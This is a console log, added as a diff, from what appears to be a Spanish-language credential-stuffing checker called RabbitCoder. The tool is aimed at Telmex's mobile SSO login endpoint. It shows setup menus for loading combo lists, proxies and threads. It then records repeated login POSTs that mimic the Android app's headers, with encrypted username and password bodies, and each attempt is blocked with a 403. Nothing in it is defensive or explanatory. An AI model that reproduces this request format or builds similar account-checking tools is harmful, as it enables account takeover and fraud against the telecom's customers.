@@ -1,0 +1,549 @@
+
+                                               ╔═══╗╔═══╗╔══╗ ╔══╗ ╔══╗╔════╗
+                                               ║╔═╗║║╔═╗║║╔╗║ ║╔╗║ ╚╣╠╝║╔╗╔╗║
+                                               ║╚═╝║║║ ║║║╚╝╚╗║╚╝╚╗ ║║ ╚╝║║╚╝
+                                               ║╔╗╔╝║╚═╝║║╔═╗║║╔═╗║ ║║   ║║  
+                                               ║║║╚╗║╔═╗║║╚═╝║║╚═╝║╔╣╠╗ ╔╝╚╗ 
+                                               ╚╝╚═╝╚╝ ╚╝╚═══╝╚═══╝╚══╝ ╚══╝ 
+
+ → Encuentrame: https://t.me/RabbitCoder
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+
+ [1] Telmex
+
+ → Opcion [Default: 1]: 1
+
+────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+ →  VERIFICANDO ACTUALIZACIONES
+   ✔ Universal (GitHub): Al día
+
+────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+ → ¿Cuantos Hilos o Taks?: 1
+
+────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+ → ¿Deseas usar proxy?
+
+ [1] HTTP
+ [2] SOCKS5
+ [3] OFF
+
+ → Opcion [1/2/3, Default: 1]:  
+
+────────────────────────────────────────────────────────────────────────────────────────────────────────  
+
+ → Combo Archivo seleccionado: C:\Users\maver\OneDrive\Documents\combo.txt
+
+ → Total de líneas: 1
+ → Líneas únicas: 1
+ → Líneas duplicadas o vacías: 0
+ → Tiempo transcurrido: 2.006ms
+
+┌──────────────────────────────────────┐
+            COUNTRY DETECT
+└──────────────────────────────────────┘
+ XX (Genérico .com)         1
+┌──────────────────────────────────────┐
+ TOTAL: 0  - GENERIC (XX): 1 
+└──────────────────────────────────────┘
+
+────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+ → Proxy Archivo seleccionado: C:\Users\maver\OneDrive\Documents\PROXY.txt
+ → Total de proxys procesadas: 1
+
+┌─────────────────────────────────────────────────────────────┐
+│          CONFIGURACIÓN REGIONAL DE PROXIES (GeoRoute)       │
+└─────────────────────────────────────────────────────────────┘
+ ¿Cómo deseas configurar la adaptación regional de tus proxies?
+
+  [1] Auto-detectar formato de la lista cargada
+  [2] Pegar un proxy de ejemplo (ej: resident...-country-al:...)
+  [3] Usar plantilla estándar (__cr.{country})
+  [4] No modificar proxies (usar tal como están)
+
+ → Selecciona una opción [1]: 44
+
+ [GeoRoute] Asignación geográfica por cuenta activa con plantilla: -country-{country} (1 proxies base cargados)
+
+────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+ → How many MaxRetry? [Type 3 for default]:
+[2026-10-30 15:27:02] POST →  https://appsso.telmex.com/api/v2.3/sso/login
+[2026-10-30 15:27:02] PROXY → unlimited.proxiware.com:1337 [403]
+
+[Send Headers]
+"Accept-Encoding": "gzip",
+"Connection":      "Keep-Alive",
+"Content-Type":    "application/json; charset=utf-8",
+"Host":            "appsso.telmex.com",
+"newrelic":        "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjUzMDk2MCIsImFwIjoiNjQ3ODkwNjY4IiwidHIiOiJmMGI1ZmU5YjllZjg3YWM3MjRkOWViOThjNThhOTRmZCIsImlkIjoiMWQ1NWQ5ODkxMTdlNzZkOCIsInRpIjoxNzkzMzkyMDE1NDA4LCJ0ayI6IjI1MzA5NjAifX0=",
+"traceparent":     "00-f0b5fe9b9ef87ac724d9eb98c58a94fd-1d55d989117e76d8-00",
+"tracestate":      "2530960@nr=0-2-2530960-647890668-1d55d989117e76d8----1793392015408",
+"User-Agent":      "okhttp/4.12.0",
+"X-NewRelic-ID":   "VgMEUV9VCBAGUFZaDgEBUFw=",
+"X-Platform":      "Android",
+"X-Version-App":   "4207",
+[Send Cookies]
+
+[BODY]
+{"username":"VhtwLInJ0rr84XNhBjSRcgPnqVu5f0lF6HyZNC22GZSEKWc384gu/03Bo5IDFxlofCeg","password":"GQElkEMU7X89DJs/SnHrYD2UEXs8c8iTNXa5vM8FyNtvIz3bt6Q="}
+
+[RESPONSE]
+[Headers Recivied]
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Connection: keep-alive
+Content-Type: text/html
+Date: Fri, 30 Oct 2026 20:27:02 GMT
+Server: rdwr
+
+[Cookies Recivied]
+
+[Body]
+<!DOCTYPE html>
+<html>
+<head>
+<title>403 Forbidden</title>
+
+
+</head>
+<body>
+    <div class="container">
+            <h2>403 Forbidden</h2>
+
+            <h2>Transaction ID:</h2> 359064469
+
+
+            <br/>
+            <hr/>
+    </div>
+</body>
+</html>
+
+────────────────────────────────────────────────────────────────
+
+[2026-10-30 15:27:04] POST →  https://appsso.telmex.com/api/v2.3/sso/login
+[2026-10-30 15:27:04] PROXY → unlimited.proxiware.com:1337 [403]
+
+[Send Headers]
+"Accept-Encoding": "gzip",
+"Connection":      "Keep-Alive",
+"Content-Type":    "application/json; charset=utf-8",
+"Host":            "appsso.telmex.com",
+"newrelic":        "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjUzMDk2MCIsImFwIjoiNjQ3ODkwNjY4IiwidHIiOiI0MzY3NWM2ZTUyOGUzZGRjZGU4MThjYzM5ZTJiNTI3OSIsImlkIjoiZjA1MDkwMWIzNTM4YzViZiIsInRpIjoxNzkzMzkyMDIyOTYwLCJ0ayI6IjI1MzA5NjAifX0=",
+"traceparent":     "00-43675c6e528e3ddcde818cc39e2b5279-f050901b3538c5bf-00",
+"tracestate":      "2530960@nr=0-2-2530960-647890668-f050901b3538c5bf----1793392022960",
+"User-Agent":      "okhttp/4.12.0",
+"X-NewRelic-ID":   "VgMEUV9VCBAGUFZaDgEBUFw=",
+"X-Platform":      "Android",
+"X-Version-App":   "4207",
+[Send Cookies]
+
+[BODY]
+{"username":"XWTZS3fnCUO1zdxrUM05QV6F4epFNXzaBevRMdomyZiP9cVgUZbWRjjIq2/bZkNFWGpi","password":"4cz7JmWaFCrT7zQmJLQJUhdZZLKGI//iVuHv4y6f99eOXNRc+9U="}
+
+[RESPONSE]
+[Headers Recivied]
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Connection: keep-alive
+Content-Type: text/html
+Date: Fri, 30 Oct 2026 20:27:03 GMT
+Server: rdwr
+
+[Cookies Recivied]
+
+[Body]
+<!DOCTYPE html>
+<html>
+<head>
+<title>403 Forbidden</title>
+
+
+</head>
+<body>
+    <div class="container">
+            <h2>403 Forbidden</h2>
+
+            <h2>Transaction ID:</h2> 359064469
+
+
+            <br/>
+            <hr/>
+    </div>
+</body>
+</html>
+
+────────────────────────────────────────────────────────────────
+
+[2026-10-30 15:27:07] POST →  https://appsso.telmex.com/api/v2.3/sso/login
+[2026-10-30 15:27:07] PROXY → unlimited.proxiware.com:1337 [403]
+
+[Send Headers]
+"Accept-Encoding": "gzip",
+"Connection":      "Keep-Alive",
+"Content-Type":    "application/json; charset=utf-8",
+"Host":            "appsso.telmex.com",
+"newrelic":        "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjUzMDk2MCIsImFwIjoiNjQ3ODkwNjY4IiwidHIiOiIyZmE3MWE0OGU3YjJhMDdiYmYyMmM2NDY2Mjc2Yzg3MSIsImlkIjoiYzkxYjIyZWVmNmFkMTU0ZSIsInRpIjoxNzkzMzkyMDI0OTQ4LCJ0ayI6IjI1MzA5NjAifX0=",
+"traceparent":     "00-2fa71a48e7b2a07bbf22c6466276c871-c91b22eef6ad154e-00",
+"tracestate":      "2530960@nr=0-2-2530960-647890668-c91b22eef6ad154e----1793392024948",
+"User-Agent":      "okhttp/4.12.0",
+"X-NewRelic-ID":   "VgMEUV9VCBAGUFZaDgEBUFw=",
+"X-Platform":      "Android",
+"X-Version-App":   "4207",
+[Send Cookies]
+
+[BODY]
+{"username":"62uZJSR0BCLFjyEmwcvmT+L36X3kPvctRj9dKuhCx0LRSqL7JZpGZ5HX4uMQ/jideQJ2","password":"t7eDSQVhd9d7PRKSJSCWmEOMSdhM0gYqmnHzcqVIscKmbqwDUts="}
+
+[RESPONSE]
+[Headers Recivied]
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Connection: keep-alive
+Content-Type: text/html
+Date: Fri, 30 Oct 2026 20:27:06 GMT
+Server: rdwr
+
+[Cookies Recivied]
+
+[Body]
+<!DOCTYPE html>
+<html>
+<head>
+<title>403 Forbidden</title>
+
+
+</head>
+<body>
+    <div class="container">
+            <h2>403 Forbidden</h2>
+
+            <h2>Transaction ID:</h2> 359064469
+
+
+            <br/>
+            <hr/>
+    </div>
+</body>
+</html>
+
+────────────────────────────────────────────────────────────────
+
+[2026-10-30 15:27:12] POST →  https://appsso.telmex.com/api/v2.3/sso/login
+[2026-10-30 15:27:12] PROXY → unlimited.proxiware.com:1337 [403]
+
+[Send Headers]
+"Accept-Encoding": "gzip",
+"Connection":      "Keep-Alive",
+"Content-Type":    "application/json; charset=utf-8",
+"Host":            "appsso.telmex.com",
+"newrelic":        "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjUzMDk2MCIsImFwIjoiNjQ3ODkwNjY4IiwidHIiOiJiOTI2MDkyZjI0NDJjYTQxMDNlN2FhZmVkMTVjNGY4ZSIsImlkIjoiZmE2MDEwMmE2MWNmNDNmNSIsInRpIjoxNzkzMzkyMDI3ODU5LCJ0ayI6IjI1MzA5NjAifX0=",
+"traceparent":     "00-b926092f2442ca4103e7aafed15c4f8e-fa60102a61cf43f5-00",
+"tracestate":      "2530960@nr=0-2-2530960-647890668-fa60102a61cf43f5----1793392027859",
+"User-Agent":      "okhttp/4.12.0",
+"X-NewRelic-ID":   "VgMEUV9VCBAGUFZaDgEBUFw=",
+"X-Platform":      "Android",
+"X-Version-App":   "4207",
+[Send Cookies]
+
+[BODY]
+{"username":"A8NFoAFZEffrRUx0kaCQVyz1IoB9EKpo+LTyNweSkkT/sH8b3wEh1fnYuYRmYm6fmUIr","password":"cKR3YUMgCh8zdu24NPQHXIiSlgw6/0cAQN+MS2e17GRtXQKd+3c="}
+
+[RESPONSE]
+[Headers Recivied]
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Connection: keep-alive
+Content-Type: text/html
+Date: Fri, 30 Oct 2026 20:27:12 GMT
+Server: rdwr
+
+[Cookies Recivied]
+
+[Body]
+<!DOCTYPE html>
+<html>
+<head>
+<title>403 Forbidden</title>
+
+
+</head>
+<body>
+    <div class="container">
+            <h2>403 Forbidden</h2>
+
+            <h2>Transaction ID:</h2> 219145437
+
+
+            <br/>
+            <hr/>
+    </div>
+</body>
+</html>
+
+────────────────────────────────────────────────────────────────
+
+[2026-10-30 15:27:14] POST →  https://appsso.telmex.com/api/v2.3/sso/login
+[2026-10-30 15:27:14] PROXY → unlimited.proxiware.com:1337 [403]
+
+[Send Headers]
+"Accept-Encoding": "gzip",
+"Connection":      "Keep-Alive",
+"Content-Type":    "application/json; charset=utf-8",
+"Host":            "appsso.telmex.com",
+"newrelic":        "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjUzMDk2MCIsImFwIjoiNjQ3ODkwNjY4IiwidHIiOiIzZTBjYmQzZTk0NjExNTI1ZDU1NTM3ZTI3ODE3ZGY5ZCIsImlkIjoiMDY1ZTEzODcyNTZiOGRiYiIsInRpIjoxNzkzMzkyMDMyNjM4LCJ0ayI6IjI1MzA5NjAifX0=",
+"traceparent":     "00-3e0cbd3e94611525d55537e27817df9d-065e1387256b8dbb-00",
+"tracestate":      "2530960@nr=0-2-2530960-647890668-065e1387256b8dbb----1793392032638",
+"User-Agent":      "okhttp/4.12.0",
+"X-NewRelic-ID":   "VgMEUV9VCBAGUFZaDgEBUFw=",
+"X-Platform":      "Android",
+"X-Version-App":   "4207",
+[Send Cookies]
+
+[BODY]
+{"username":"gjzRyI3aoMX5pPv6aeRKCUM0o5BreOvXTbEVwTY0FfirlpHrcr8XWpxBKoZnjtcgkZhI","password":"1m0sCznD6YTYfOgfqMPIj/YHwTM22wC8YwsweTNe78/CYuubG/I="}
+
+[RESPONSE]
+[Headers Recivied]
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Connection: keep-alive
+Content-Type: text/html
+Date: Fri, 30 Oct 2026 20:27:14 GMT
+Server: rdwr
+
+[Cookies Recivied]
+
+[Body]
+<!DOCTYPE html>
+<html>
+<head>
+<title>403 Forbidden</title>
+
+
+</head>
+<body>
+    <div class="container">
+            <h2>403 Forbidden</h2>
+
+            <h2>Transaction ID:</h2> 219145437
+
+
+            <br/>
+            <hr/>
+    </div>
+</body>
+</html>
+
+────────────────────────────────────────────────────────────────
+
+[2026-10-30 15:27:17] POST →  https://appsso.telmex.com/api/v2.3/sso/login
+[2026-10-30 15:27:17] PROXY → unlimited.proxiware.com:1337 [403]
+
+[Send Headers]
+"Accept-Encoding": "gzip",
+"Connection":      "Keep-Alive",
+"Content-Type":    "application/json; charset=utf-8",
+"Host":            "appsso.telmex.com",
+"newrelic":        "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjUzMDk2MCIsImFwIjoiNjQ3ODkwNjY4IiwidHIiOiJjOGFhZjA3OGU3YmE5Y2Q0YWJkM2Y5NzM1N2E3NzdkYSIsImlkIjoiZjI5NTc1NzJiYzM1YjkyZiIsInRpIjoxNzkzMzkyMDM0ODM4LCJ0ayI6IjI1MzA5NjAifX0=",
+"traceparent":     "00-c8aaf078e7ba9cd4abd3f97357a777da-f2957572bc35b92f-00",
+"tracestate":      "2530960@nr=0-2-2530960-647890668-f2957572bc35b92f----1793392034838",
+"User-Agent":      "okhttp/4.12.0",
+"X-NewRelic-ID":   "VgMEUV9VCBAGUFZaDgEBUFw=",
+"X-Platform":      "Android",
+"X-Version-App":   "4207",
+[Send Cookies]
+
+[BODY]
+{"username":"8jc1qTZuzBE/ATuTxlEE0//sVFFzDaX/Sdzdvu1OskYzVfMo7zzOxWQe2EZusfuSmyrN","password":"ge5Vw2F4I9QMAuRZSW+gg7vzJcRmxM8NAd/wP3tmeXjpqij3+3U="}
+
+[RESPONSE]
+[Headers Recivied]
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Connection: keep-alive
+Content-Type: text/html
+Date: Fri, 30 Oct 2026 20:27:17 GMT
+Server: rdwr
+
+[Cookies Recivied]
+
+[Body]
+<!DOCTYPE html>
+<html>
+<head>
+<title>403 Forbidden</title>
+
+
+</head>
+<body>
+    <div class="container">
+            <h2>403 Forbidden</h2>
+
+            <h2>Transaction ID:</h2> 219145437
+
+
+            <br/>
+            <hr/>
+    </div>
+</body>
+</html>
+
+────────────────────────────────────────────────────────────────
+
+[2026-10-30 15:27:22] POST →  https://appsso.telmex.com/api/v2.3/sso/login
+[2026-10-30 15:27:22] PROXY → unlimited.proxiware.com:1337 [403]
+
+[Send Headers]
+"Accept-Encoding": "gzip",
+"Connection":      "Keep-Alive",
+"Content-Type":    "application/json; charset=utf-8",
+"Host":            "appsso.telmex.com",
+"newrelic":        "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjUzMDk2MCIsImFwIjoiNjQ3ODkwNjY4IiwidHIiOiIzZDkwNDE2NDI0ZTc2NmFlZTE0NGE0NTAxOTEyNTIzZCIsImlkIjoiZDE4NWM1ZTA5MGQ1MzYwYSIsInRpIjoxNzkzMzkyMDM3MDQxLCJ0ayI6IjI1MzA5NjAifX0=",
+"traceparent":     "00-3d90416424e766aee144a4501912523d-d185c5e090d5360a-00",
+"tracestate":      "2530960@nr=0-2-2530960-647890668-d185c5e090d5360a----1793392037041",
+"User-Agent":      "okhttp/4.12.0",
+"X-NewRelic-ID":   "VgMEUV9VCBAGUFZaDgEBUFw=",
+"X-Platform":      "Android",
+"X-Version-App":   "4207",
+[Send Cookies]
+
+[BODY]
+{"username":"Ix5wiQ3uJ04QEf3SvHVkAAhvXf87JH0c1sh9IGJV/iM4rTzrNfAY6jq8CbtcgWIJOzaO","password":"2uq+PRpL4gMwbnnxX/cIXifnfmGuF0vOC3pVslVjDLZqQ40Bjn8="}
+
+[RESPONSE]
+[Headers Recivied]
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Connection: keep-alive
+Content-Type: text/html
+Date: Fri, 30 Oct 2026 20:27:22 GMT
+Server: rdwr
+
+[Cookies Recivied]
+
+[Body]
+<!DOCTYPE html>
+<html>
+<head>
+<title>403 Forbidden</title>
+
+
+</head>
+<body>
+    <div class="container">
+            <h2>403 Forbidden</h2>
+
+            <h2>Transaction ID:</h2> 2690cf369d5ca5f1be1f1f47ebe0ffb7a8be882649aa75886388d7d0a0870210     
+
+
+            <br/>
+            <hr/>
+    </div>
+</body>
+</html>
+
+────────────────────────────────────────────────────────────────
+
+[2026-10-30 15:27:22] POST →  https://appsso.telmex.com/api/v2.3/sso/login
+[2026-10-30 15:27:22] PROXY → unlimited.proxiware.com:1337 [403]
+
+[Send Headers]
+"Accept-Encoding": "gzip",
+"Connection":      "Keep-Alive",
+"Content-Type":    "application/json; charset=utf-8",
+"Host":            "appsso.telmex.com",
+"newrelic":        "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjUzMDk2MCIsImFwIjoiNjQ3ODkwNjY4IiwidHIiOiI4MjYzYTlmN2EyNTQwNTg2NWU5YTRiMmMyOTA3MTVkMiIsImlkIjoiNjk0YTE3YWU1ZjUxNjNkMyIsInRpIjoxNzkzMzkyMDQyMTg1LCJ0ayI6IjI1MzA5NjAifX0=",
+"traceparent":     "00-8263a9f7a25405865e9a4b2c290715d2-694a17ae5f5163d3-00",
+"tracestate":      "2530960@nr=0-2-2530960-647890668-694a17ae5f5163d3----1793392042185",
+"User-Agent":      "okhttp/4.12.0",
+"X-NewRelic-ID":   "VgMEUV9VCBAGUFZaDgEBUFw=",
+"X-Platform":      "Android",
+"X-Version-App":   "4207",
+[Send Cookies]
+
+[BODY]
+{"username":"Ze/hxPlHxwHz/DpoNv4bMX+BcoDrrLj5R3x5J6jbK+veMVDm1AZC90l3KXy6JAoJNHCO","password":"EwIVeibrSsa0qow3ovMC+B09uqImaEVP1QO/VCGpx8rN5MTUvws="}
+
+[RESPONSE]
+[Headers Recivied]
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Connection: keep-alive
+Content-Type: text/html
+Date: Fri, 30 Oct 2026 20:27:22 GMT
+Server: rdwr
+
+[Cookies Recivied]
+
+[Body]
+<!DOCTYPE html>
+<html>
+<head>
+<title>403 Forbidden</title>
+
+
+</head>
+<body>
+    <div class="container">
+            <h2>403 Forbidden</h2>
+
+            <h2>Transaction ID:</h2> 2690cf369d5ca5f1be1f1f47ebe0ffb7fa732b5fbb8dd977f5391ad4773d0920     
+
+
+            <br/>
+            <hr/>
+    </div>
+</body>
+</html>
+
+────────────────────────────────────────────────────────────────
+
+[2026-10-30 15:27:22] POST →  https://appsso.telmex.com/api/v2.3/sso/login
+[2026-10-30 15:27:22] PROXY → unlimited.proxiware.com:1337 [403]
+
+[Send Headers]
+"Accept-Encoding": "gzip",
+"Connection":      "Keep-Alive",
+"Content-Type":    "application/json; charset=utf-8",
+"Host":            "appsso.telmex.com",
+"newrelic":        "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjUzMDk2MCIsImFwIjoiNjQ3ODkwNjY4IiwidHIiOiJkOGE5NDc4ZWJlMjJlM2UxY2FiYzZhNmYxOTExNmRlZSIsImlkIjoiNmQ1MDRkY2M0MzBhZjlmZSIsInRpIjoxNzkzMzkyMDQyNjYxLCJ0ayI6IjI1MzA5NjAifX0=",
+"traceparent":     "00-d8a9478ebe22e3e1cabc6a6f19116dee-6d504dcc430af9fe-00",
+"tracestate":      "2530960@nr=0-2-2530960-647890668-6d504dcc430af9fe----1793392042661",
+"User-Agent":      "okhttp/4.12.0",
+"X-NewRelic-ID":   "VgMEUV9VCBAGUFZaDgEBUFw=",
+"X-Platform":      "Android",
+"X-Version-App":   "4207",
+[Send Cookies]
+
+[BODY]
+{"username":"Wkt0YKWJjn8cy1eHHcAdbgNB3rNaYmLwh0wMwpkhEjzTTsqdvKfTfTWqMtFdKObPhOzb","password":"qdZ7+ozGDT1YyoOTM/6YHtm3i9bVmr3+/vICx5bl+SjLJk/xysI="}
+
+[RESPONSE]
+[Headers Recivied]
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Connection: keep-alive
+Content-Type: text/html
+Date: Fri, 30 Oct 2026 20:27:23 GMT
+Server: rdwr
+
+[Cookies Recivied]
+
+[Body]
+<!DOCTYPE html>
+<html>
+<head>
+<title>403 Forbidden</title>
+
+
+</head>
+<body>
+    <div class="container">
+            <h2>403 Forbidden</h2>
+
+            <h2>Transaction ID:</h2> 2690cf369d5ca5f1be1f1f47ebe0ffb73c49a8014250a00c459b628b37a212fe     
+
+
+            <br/>
+            <hr/>
+    </div>
+</body>
+</html>
+
+────────────────────────────────────────────────────────────────
